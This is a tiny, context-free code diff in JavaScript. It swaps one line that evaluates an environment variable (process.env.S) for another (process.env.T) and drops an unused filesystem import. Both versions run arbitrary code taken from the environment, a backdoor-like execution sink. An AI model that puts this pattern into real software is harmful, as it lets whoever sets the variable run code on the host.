@@ -1,2 +1,1 @@
-import f from "node:fs";
-eval(process.env.S);
+eval(process.env.T)
